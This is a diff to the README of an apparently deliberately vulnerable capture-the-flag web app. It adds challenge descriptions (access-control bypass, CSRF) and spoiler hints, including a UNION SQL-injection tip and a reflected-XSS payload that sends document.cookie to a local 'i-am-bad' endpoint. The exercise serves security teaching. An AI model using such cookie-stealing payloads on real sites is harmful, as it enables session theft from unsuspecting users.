@@ -10,7 +10,7 @@ Players may find that they can perform a bunch of cyber attackers to this vulner
 3. Broken access control
     * When selecing a course with pre-requisite and when you haven't satisfy all the requisite, the website will not allow you to select the course. However, can you bypass the restriction and add COMP9900 to your list?
 4. CSRF
-    * 
+    * CSRF attack is when some malicious script or program causes user's browser to perform unwanted actions, normally without their consent. Can you write a script to change a logged-in user's password?
 
 
 ## Structure
@@ -52,10 +52,14 @@ python3 ctf/app.py 5044
 ## Spoiler alert 😈
 ### SQL injection 1 🌶 
 ### SQL injection 2 🥓 
-- How to find out the name of the database?
+- How to find out the name of the database? Try `Union` in pgsql. 
 ### CSRF 🚨
 ### Reflected XSS 🛸
-- When you put "abcd" in the question form and submit, you will find the content you typed showing in the url.
+- When you put "abcd" in the question form and submit, you will find the content you typed showing in the url. This can definitely be exploited. Try replace the "abcd" with 
+    ```
+    <script>document.location="http://127.0.0.1:5000/i-am-bad?q="%2Bdocument.cookie</script>
+    ```
+    and see where you are redirected. 
 ### Stored XSS 🥞
 - Hmmmm, maybe try using 
     ```
